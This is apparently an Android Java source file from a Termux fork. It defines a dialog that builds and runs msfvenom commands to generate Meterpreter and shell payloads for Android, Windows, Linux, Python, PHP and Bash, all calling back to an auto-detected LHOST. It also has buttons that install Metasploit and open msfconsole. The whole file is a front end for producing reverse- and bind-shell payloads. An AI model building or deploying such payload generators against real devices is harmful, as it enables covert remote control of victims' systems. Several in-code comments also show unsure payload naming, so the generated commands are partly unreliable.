package com.termux.zerocore.dialog;

import android.content.Context;
import android.net.ConnectivityManager;
import android.net.LinkAddress;
import android.net.LinkProperties;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.net.NetworkRequest;
import android.os.Build;
import android.view.View;
import android.widget.AdapterView;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Spinner;
import android.widget.Toast;

import com.termux.R;
import com.termux.app.TermuxActivity;

import java.net.Inet4Address;
import java.net.InetAddress;
import java.util.ArrayList;
import com.termux.app.terminal.TermuxTerminalSessionActivityClient;
import com.termux.terminal.TerminalSession;
import com.termux.app.TermuxService;
import java.util.List;

public class MetasploitDialog extends BaseDialogCentre {

    private Spinner spinnerType;
    private EditText editTextLhost;
    private EditText editTextLport;
    private EditText editTextFilename;
    private Spinner spinnerPayload;
    private Spinner spinnerCallback;
    private Spinner spinnerStager;
    
    private Button buttonGenerate;
    private Button buttonConsole;
    private Button buttonInstall;
    
    private String selectedType = "Android";
    private String selectedPayload = "Meterpreter";
    private String selectedCallback = "Reverse";
    private String selectedStager = "Staged";

    public MetasploitDialog(Context context) {
        super(context);
    }

    public MetasploitDialog(Context context, int themeResId) {
        super(context, themeResId);
    }

    @Override
    void initViewDialog(View mView) {
        initViews(mView);
        setupSpinners();
        setupListeners();
        autoDetectIp();
    }

    @Override
    int getContentView() {
        return R.layout.dialog_metasploit;
    }

    private void initViews(View rootView) {
        spinnerType = rootView.findViewById(R.id.spinnerType);
        editTextLhost = rootView.findViewById(R.id.editTextLhost);
        editTextLport = rootView.findViewById(R.id.editTextLport);
        editTextFilename = rootView.findViewById(R.id.editTextFilename);
        spinnerPayload = rootView.findViewById(R.id.spinnerPayload);
        spinnerCallback = rootView.findViewById(R.id.spinnerCallback);
        spinnerStager = rootView.findViewById(R.id.spinnerStager);
        
        buttonGenerate = rootView.findViewById(R.id.buttonGenerate);
        buttonConsole = rootView.findViewById(R.id.buttonConsole);
        buttonInstall = rootView.findViewById(R.id.buttonInstall);
    }

    private void setupSpinners() {
        // Platform Type
        List<String> types = new ArrayList<>();
        types.add("Android");
        types.add("Windows");
        types.add("Linux");
        types.add("Python");
        types.add("PHP");
        types.add("Bash");
        
        ArrayAdapter<String> typeAdapter = new ArrayAdapter<>(mContext, android.R.layout.simple_spinner_item, types);
        typeAdapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);
        spinnerType.setAdapter(typeAdapter);
        
        // Payload (Meterpreter/Shell)
        List<String> payloads = new ArrayList<>();
        payloads.add("Meterpreter");
        payloads.add("Shell");
        
        ArrayAdapter<String> payloadAdapter = new ArrayAdapter<>(mContext, android.R.layout.simple_spinner_item, payloads);
        payloadAdapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);
        spinnerPayload.setAdapter(payloadAdapter);
        
        // Callback (Reverse/Bind)
        List<String> callbacks = new ArrayList<>();
        callbacks.add("Reverse");
        callbacks.add("Bind");
        
        ArrayAdapter<String> callbackAdapter = new ArrayAdapter<>(mContext, android.R.layout.simple_spinner_item, callbacks);
        callbackAdapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);
        spinnerCallback.setAdapter(callbackAdapter);
        
        // Stager (Staged/Stageless)
        List<String> stagers = new ArrayList<>();
        stagers.add("Staged");
        stagers.add("Stageless");
        
        ArrayAdapter<String> stagerAdapter = new ArrayAdapter<>(mContext, android.R.layout.simple_spinner_item, stagers);
        stagerAdapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);
        spinnerStager.setAdapter(stagerAdapter);
        
        // Listeners
        spinnerType.setOnItemSelectedListener(new AdapterView.OnItemSelectedListener() {
            @Override
            public void onItemSelected(AdapterView<?> parent, View view, int position, long id) {
                selectedType = types.get(position);
            }
            @Override
            public void onNothingSelected(AdapterView<?> parent) {}
        });
        
        spinnerPayload.setOnItemSelectedListener(new AdapterView.OnItemSelectedListener() {
            @Override
            public void onItemSelected(AdapterView<?> parent, View view, int position, long id) {
                selectedPayload = payloads.get(position);
            }
            @Override
            public void onNothingSelected(AdapterView<?> parent) {}
        });
        
        spinnerCallback.setOnItemSelectedListener(new AdapterView.OnItemSelectedListener() {
            @Override
            public void onItemSelected(AdapterView<?> parent, View view, int position, long id) {
                selectedCallback = callbacks.get(position);
            }
            @Override
            public void onNothingSelected(AdapterView<?> parent) {}
        });
        
        spinnerStager.setOnItemSelectedListener(new AdapterView.OnItemSelectedListener() {
            @Override
            public void onItemSelected(AdapterView<?> parent, View view, int position, long id) {
                selectedStager = stagers.get(position);
            }
            @Override
            public void onNothingSelected(AdapterView<?> parent) {}
        });
    }

    private void setupListeners() {
        buttonGenerate.setOnClickListener(v -> generatePayload());
        buttonConsole.setOnClickListener(v -> {
            executeInRootKali("msfconsole");
            dismiss();
        });
        buttonInstall.setOnClickListener(v -> {
            executeInRootKali("echo 'Checking Metasploit...'; apt-get update && apt-get install metasploit-framework -y");
            dismiss();
        });
    }

    private void executeInRootKali(String command) {
        if (mContext instanceof TermuxActivity) {
            TermuxActivity activity = (TermuxActivity) mContext;
            TermuxService mTermuxService = activity.mTermuxService;
            TermuxTerminalSessionActivityClient mTermuxTerminalSessionActivityClient = activity.mTermuxTerminalSessionActivityClient;
            
            String sessionName = "Kali-Root";
            TerminalSession targetSession = null;

            if (mTermuxService != null) {
                List<com.termux.shared.termux.shell.command.runner.terminal.TermuxSession> sessions = mTermuxService.getTermuxSessions();
                for (int i = 0; i < sessions.size(); i++) {
                    TerminalSession session = sessions.get(i).getTerminalSession();
                    if (sessionName.equals(session.mSessionName)) {
                        targetSession = session;
                        break;
                    }
                }
            }

            if (targetSession != null) {
                mTermuxTerminalSessionActivityClient.setCurrentSession(targetSession);
            } else {
                mTermuxTerminalSessionActivityClient.addNewSession(false, sessionName);
            }

            // Ensure we are in nethunter root environment
            if (TermuxActivity.mTerminalView != null) {
                TermuxActivity.mTerminalView.sendTextToTerminal("nethunter -r\n");
                // Add a small delay or just send the next command. 
                // Since sendTextToTerminal just writes to the stream, it might happen too fast if nethunter takes time to load.
                // But typically user will see the prompt change.
                TermuxActivity.mTerminalView.sendTextToTerminal(command + "\n");
            }
        }
    }

    private void autoDetectIp() {
        ConnectivityManager cm = (ConnectivityManager) mContext.getSystemService(Context.CONNECTIVITY_SERVICE);
        if (cm != null) {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                 Network activeNetwork = cm.getActiveNetwork();
                 if (activeNetwork != null) {
                     LinkProperties linkProperties = cm.getLinkProperties(activeNetwork);
                     if (linkProperties != null) {
                         for (LinkAddress linkAddress : linkProperties.getLinkAddresses()) {
                             InetAddress address = linkAddress.getAddress();
                             if (address instanceof Inet4Address && !address.isLoopbackAddress()) {
                                 editTextLhost.setText(address.getHostAddress());
                                 return;
                             }
                         }
                     }
                 }
             }
        }
    }

    private void generatePayload() {
        String lhost = editTextLhost.getText().toString().trim();
        String lport = editTextLport.getText().toString().trim();
        String filename = editTextFilename.getText().toString().trim();
        
        if (lhost.isEmpty()) {
            Toast.makeText(mContext, "请输入 LHOST IP", Toast.LENGTH_SHORT).show();
            return;
        }
        if (lport.isEmpty()) lport = "4444";
        if (filename.isEmpty()) filename = "payload";
        
        // Build msfvenom command
        // Format: msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <format> -o <output>
        
        String payloadStr = "";
        String format = "";
        String ext = "";
        
        // 1. Determine base payload string
        // Logic: <platform>/<arch>/<payload_type>/<callback_method>
        // But msfvenom naming is inconsistent.
        // Common: android/meterpreter/reverse_tcp
        // windows/meterpreter/reverse_tcp
        // linux/x86/meterpreter/reverse_tcp
        
        String arch = ""; // e.g., x86
        
        switch (selectedType) {
            case "Android":
                payloadStr = "android/";
                format = "apk";
                ext = "apk";
                break;
            case "Windows":
                payloadStr = "windows/";
                // arch? default usually x86 for compatibility
                format = "exe";
                ext = "exe";
                break;
            case "Linux":
                payloadStr = "linux/x86/"; // Defaulting to x86
                format = "elf";
                ext = "elf";
                break;
            case "Python":
                payloadStr = "python/";
                format = "raw";
                ext = "py";
                break;
            case "PHP":
                payloadStr = "php/";
                format = "raw";
                ext = "php";
                break;
            case "Bash":
                payloadStr = "cmd/unix/";
                format = "raw";
                ext = "sh";
                break;
        }
        
        // 2. Add Payload Type (Meterpreter/Shell)
        if (selectedType.equals("Android")) {
            if (selectedPayload.equals("Meterpreter")) payloadStr += "meterpreter/";
            else payloadStr += "shell/";
        } else if (selectedType.equals("Python") || selectedType.equals("PHP") || selectedType.equals("Bash")) {
            // Script payloads usually serve meterpreter directly
             if (selectedPayload.equals("Meterpreter")) payloadStr += "meterpreter/";
             else payloadStr += "shell/"; // might vary
             
             if (selectedType.equals("Bash")) {
                 // cmd/unix/reverse_bash
                 payloadStr = "cmd/unix/"; 
                 // Bash is special.
             }
        } else {
             if (selectedPayload.equals("Meterpreter")) payloadStr += "meterpreter/";
             else payloadStr += "shell/"; // windows/shell/reverse_tcp
        }
        
        // 3. Add Callback (Reverse/Bind) and Protocol (TCP)
        // We simplified protocol to TCP in this basic version
        String callbackStr = "";
        if (selectedCallback.equals("Reverse")) callbackStr = "reverse_tcp";
        else callbackStr = "bind_tcp";
        
        // Special Handling
        if (selectedType.equals("Bash")) {
            if (selectedCallback.equals("Reverse")) payloadStr += "reverse_bash";
            else payloadStr += "bind_perl"; // bash bind is rare/tricky, maybe just fallback
        } else {
            payloadStr += callbackStr;
        }
        
        // Stageless check (simplified: stageless often means reverse_tcp vs reverse_tcp_uuid or similar, 
        // OR using specific payloads like windows/meterpreter_reverse_tcp (stageless) vs windows/meterpreter/reverse_tcp (staged))
        // For Android: android/meterpreter/reverse_tcp is staged. android/meterpreter_reverse_tcp is stageless.
        if (selectedStager.equals("Stageless")) {
             // Try to convert standard staged syntax to stageless if possible
             // Common convention: / -> _ between meterpreter and reverse
             payloadStr = payloadStr.replace("meterpreter/", "meterpreter_");
             payloadStr = payloadStr.replace("shell/", "shell_");
        }
        
        // Output path
        String outputPath = "/sdcard/Download/" + filename + "." + ext;
        
        StringBuilder cmd = new StringBuilder();
        cmd.append("msfvenom -p ").append(payloadStr);
        cmd.append(" LHOST=").append(lhost);
        cmd.append(" LPORT=").append(lport);
        
        if (selectedType.equals("Android")) {
             // Android usually doesn't need -f apk if -p android/... but good to be explicit or check docs.
             // Actually msfvenom -p android/... -o file.apk works.
             // -f raw vs -f apk?
             // usually -o is enough for android? No, need output format?
             // For android, default format is often apk?
             // Let's use -o directly.
        } else {
            if (!format.equals("raw")) {
                cmd.append(" -f ").append(format);
            }
        }
        
        cmd.append(" -o ").append(outputPath);
        
        // Send command
        executeInRootKali(cmd.toString());
        if (TermuxActivity.mTerminalView != null) {
            TermuxActivity.mTerminalView.sendTextToTerminal("echo 'Saved to " + outputPath + "'\n");
        }
        dismiss();
    }
}
